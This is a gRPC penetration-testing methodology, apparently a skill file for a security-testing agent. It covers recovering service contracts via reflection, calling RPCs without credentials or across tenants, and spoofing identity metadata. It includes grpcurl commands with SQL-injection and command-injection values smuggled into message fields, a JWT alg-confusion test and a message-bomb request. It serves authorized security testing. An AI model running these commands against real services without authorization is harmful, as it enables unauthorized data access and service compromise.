---
name: grpc
description: gRPC service testing via reflection enumeration, method fuzzing, authz bypass, and HTTP/2 transport abuse
---

# gRPC Service

A gRPC service exposes remote procedures over HTTP/2, typically serializing Protocol Buffers as the message body. Unlike REST, the contract lives in `.proto` definitions, not URLs, so the first objective is to recover that contract — via server reflection, leaked protos, or transcoding gateways — then exercise every method to find missing per-method authorization, injection sinks behind the typed interface, and HTTP/2-level transport flaws. The attacker's goal is to call privileged RPCs without authorization, smuggle malicious payloads through deserialization, and pivot from the service into backend datastores and internal microservices it fronts.

## Attack Surface

**Transport**
- HTTP/2 over TLS (h2) on 443/8443, or cleartext h2c on 50051/9090/8080
- gRPC-Web (`Content-Type: application/grpc-web[-text]`) fronted by Envoy/nginx for browsers
- JSON/HTTP transcoding gateways (`grpc-gateway`, Envoy `grpc_json_transcoder`) exposing RPCs as REST

**Contract & Methods**
- Server reflection service (`grpc.reflection.v1alpha.ServerReflection`, `grpc.reflection.v1`) — leaks every service, method, and message type
- `grpc.health.v1.Health/Check`, `grpc.channelz`, and `grpc.server.reflection` housekeeping services
- Streaming RPCs (client-stream, server-stream, bidi) — often weaker rate limiting and auth than unary

**Auth & Metadata**
- Per-RPC credentials in metadata: `authorization: Bearer ...`, `x-api-key`, mTLS client certs, `cookie`
- Interceptors enforcing authn/authz — frequently applied unevenly across methods

**Indirect**
- Backend datastores, queues, and downstream gRPC services the methods proxy to
- Protobuf field-mask / `Any` / `oneof` handling, and the deserializer itself

## Recon & Enumeration

Install gRPC tooling (not in base Kali). `grpcurl` is the primary client; `ghz` for load/streaming; `buf` for proto handling:

```bash
# grpcurl + ghz (Go) — pull static binaries
GO111MODULE=on go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
GO111MODULE=on go install github.com/bojand/ghz/cmd/ghz@latest
# or release tarballs:
curl -sL https://github.com/fullstorydev/grpcurl/releases/latest/download/grpcurl_linux_x86_64.tar.gz | tar -xz -C /usr/local/bin grpcurl
# proto tooling
apt-get install -y protobuf-compiler && go install github.com/bufbuild/buf/cmd/buf@latest
# browser/Envoy front: grpcui for interactive method calls
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
```

```bash
# 1. Find the port and confirm HTTP/2 / gRPC
nmap -p- --min-rate 2000 -sV target.tld -oA grpc_ports        # locate 50051/8443/9090
naabu -host target.tld -p 50051,9090,8080,443,8443 -silent
httpx -u https://target.tld:8443 -http2 -tech-detect -title    # ALPN h2 confirms HTTP/2

# 2. Probe server reflection (cleartext h2c)
grpcurl -plaintext target.tld:50051 list
grpcurl -plaintext target.tld:50051 list pkg.v1.AccountService
grpcurl -plaintext target.tld:50051 describe pkg.v1.AccountService.GetUser

# 3. TLS endpoint (skip cert verify only in authorized testing)
grpcurl -insecure target.tld:443 list
grpcurl -d @ -insecure target.tld:443 pkg.v1.AccountService/GetUser <<<'{"id":"1"}'

# 4. If reflection is OFF, supply a proto or import set
grpcurl -proto api.proto -import-path ./protos -plaintext target.tld:50051 list
buf curl --schema ./protos --protocol grpc http://target.tld:50051/pkg.v1.Svc/Method

# 5. gRPC-Web / transcoding gateway recon (looks like REST)
katana -u https://app.tld -jc -d 3 | httpx -mc 200 -silent       # find /v1/... transcoded routes
ffuf -u https://target.tld:8443/FUZZ -w grpc-services.txt -H "Content-Type: application/grpc"
nuclei -u https://target.tld:8443 -tags grpc,http2 -s critical,high -silent

# 6. Hunt protos/secrets in source to rebuild the contract offline
gitleaks dir . --no-banner ; trufflehog filesystem . --only-verified
semgrep --config p/secrets --config p/grpc .                     # missing authz interceptors, insecure creds
grep -rn "grpc.WithInsecure\|insecure.NewCredentials\|reflection.Register" .
```

## Methodology

1. **Locate transport.** Port-scan for h2/h2c; confirm HTTP/2 via ALPN (`httpx -http2`). Distinguish native gRPC (`application/grpc`), gRPC-Web, and JSON-transcoding gateways — each needs a different client.
2. **Recover the contract.** Try reflection first (`grpcurl list`). If disabled, harvest `.proto` files from JS bundles, mobile APKs (`jadx`), GitHub, OpenAPI/Swagger of the gateway, or Envoy config. Reconstruct a descriptor set with `buf` or `protoc --descriptor_set_out`.
3. **Map every method.** `describe` each service to record method names, input/output messages, streaming type, and which fields are required. Note housekeeping services (Health, Channelz, Reflection) that should not be public.
4. **Establish an authed baseline.** Capture a legitimate session's metadata (`authorization`, `x-api-key`, mTLS cert) so you can diff authorized vs unauthorized behavior per method.
5. **Test authorization per method.** Call each RPC with no metadata, an expired/other-tenant token, and a low-privilege token. Authz in gRPC is enforced by interceptors that are easy to forget on individual methods.
6. **Fuzz inputs.** Mutate every field — IDs, field masks, `oneof` selectors, nested messages, `bytes`, and `Any`-typed fields — to probe IDOR, injection (SQL/NoSQL/command behind the typed surface), and deserialization issues.
7. **Probe transport.** Test h2c upgrade, large/compressed messages (decompression bombs), header smuggling via metadata, and trailer handling.
8. **Validate & chain.** Confirm each finding with a reproducible `grpcurl` PoC; chain leaked contract + missing authz into cross-tenant data access or backend pivot.

## Key Weaknesses / Techniques

**Reflection / contract disclosure**
- Public reflection lets anyone enumerate the full API: `grpcurl -plaintext target:50051 list` then `describe`. Treat this as information disclosure that unlocks every other test. Even with reflection off, `describe` works once a proto is supplied.

**Missing or inconsistent per-method authorization (IDOR / BOLA)**
- Call privileged RPCs with no credentials or another tenant's ID. Interceptors often guard `AdminService` but skip a newer method.
```bash
# No auth at all
grpcurl -plaintext -d '{"user_id":"1001"}' target:50051 pkg.v1.AccountService/GetUser
# Cross-tenant: valid token from tenant A, ask for tenant B's object
grpcurl -H "authorization: Bearer $TOKEN_A" -d '{"account_id":"B-2002"}' \
  -insecure target:443 pkg.v1.BillingService/GetInvoice
```

**Injection behind the typed interface**
- String fields flow into SQL/NoSQL/OS calls server-side. Smuggle payloads in message fields:
```bash
grpcurl -plaintext -d '{"username":"admin'\'' OR 1=1-- -"}' target:50051 pkg.v1.AuthService/Login
grpcurl -plaintext -d '{"path":"; id #"}' target:50051 pkg.v1.FileService/Read
```
- For deep DBMS testing, transcode to JSON via the gateway and point `sqlmap` at the REST route, or proxy gRPC-Web through Burp.

**h2c cleartext smuggling / downgrade**
- Services bound to h2c (`-plaintext`) behind a TLS proxy may be reachable directly, bypassing the proxy's auth/WAF. Confirm by hitting the backend port without TLS.

**Metadata / header abuse**
- Spoof identity headers a trusting interceptor reads: `-H "x-user-id: 1"`, `-H "x-forwarded-for: 127.0.0.1"`, `-H "x-internal: true"`. Test JWTs in `authorization` with `jwt_tool $JWT -X a` (alg confusion / none).

**Resource exhaustion / message bombs**
- Servers without `MaxRecvMsgSize` limits accept oversized or compression-bombed messages. Validate impact cautiously and bounded:
```bash
ghz --insecure --call pkg.v1.Svc/Echo -d '{"blob":"'"$(head -c 1000000 /dev/zero | base64)"'"}' \
    -c 1 -n 5 target:443       # observe memory/latency, keep volume low
```

**Streaming auth gaps**
- Auth may be checked at stream open but not per-message; long-lived bidi streams can outlive token expiry. Open a stream with a soon-to-expire token and keep sending.

**gRPC-Web / transcoding parser differentials**
- The gateway and backend may validate differently. Send malformed `application/grpc-web-text` (base64 framing) or oversized JSON to reach states the native path blocks.

## Validation

1. Reproduce with a single deterministic `grpcurl` (or `buf curl`) command and capture full output; record the exact method, metadata, and message.
2. For authz findings, show the same RPC succeeding with no/low-priv credentials and returning another principal's data — diff against the authorized baseline to prove it is a real bypass, not your own object.
3. For injection, demonstrate a controlled, non-destructive oracle (boolean/time-based) or harmless data read; avoid mutating RPCs.
4. For reflection/info disclosure, save the enumerated service+method list as evidence.
5. For blind backend calls (SSRF-like proxying), confirm egress with `interactsh-client` and embed the OAST domain in a URL/host field.

## False Positives

- Reflection enabled on a deliberately public/sandbox API — confirm it is the production surface.
- `grpc.health.v1.Health/Check` returning `SERVING` is expected; not a finding alone.
- `Unauthenticated`/`PermissionDenied` (codes 16/7) on unauth calls means authz works — the absence of these on privileged methods is the finding.
- `Unimplemented` (code 12) means the method/service is not exposed there, not a bypass.
- Self-IDOR: retrieving your own object via your own ID is not BOLA; you must cross a tenant/user boundary.
- gRPC-Web 200 with an error `grpc-status` trailer is an application error, not access — read the trailer, not the HTTP code.

## Chaining & Impact

- Reflection → full method map → discover an unguarded `AdminService`/`InternalService` method → privileged action without credentials.
- Missing per-method authz → BOLA across tenants → bulk PII/financial data exfiltration via list/stream RPCs.
- Injection in a field → backend SQL/NoSQL compromise; a `bytes`/`Any` field feeding an unsafe deserializer → RCE on the service.
- h2c downgrade → bypass front proxy auth/WAF → reach internal-only methods and admin RPCs.
- Spoofed identity metadata trusted by an interceptor → authentication bypass → account takeover.
- Service-proxy method with a URL/host field → SSRF into cloud metadata and internal microservices (see ssrf skill) → credential theft and lateral movement.

## Pro Tips

1. Always try reflection first; it converts a blind target into a fully described API in one command. If off, mine mobile apps and JS bundles for `.proto`/descriptor sets before giving up.
2. Use `grpcurl -d @` with heredocs for complex nested messages and `oneof` fields that inline JSON makes awkward.
3. The error code is the signal: `7`/`16` = authz active, `12` = not implemented, `3` (`InvalidArgument`) = you reached the handler and it parsed your input — keep fuzzing that one.
4. Test the h2c backend port directly; teams forget the cleartext listener is reachable past the TLS/WAF front.
5. Streaming RPCs are the soft underbelly — auth, rate limits, and input validation are routinely weaker than on unary methods.
6. `grpcui` gives a browser form over reflection for fast manual method exploration; pair with Burp (Content-Type `application/grpc-web-text`) to fuzz the transcoded path.
7. Run `semgrep` over recovered source for `WithInsecure`, registered reflection in prod, and methods lacking an auth interceptor — static gaps map directly to runtime tests.
8. Keep load/exhaustion tests tiny and bounded (`ghz -n` low); the goal is to prove the missing limit, not to disrupt the service.
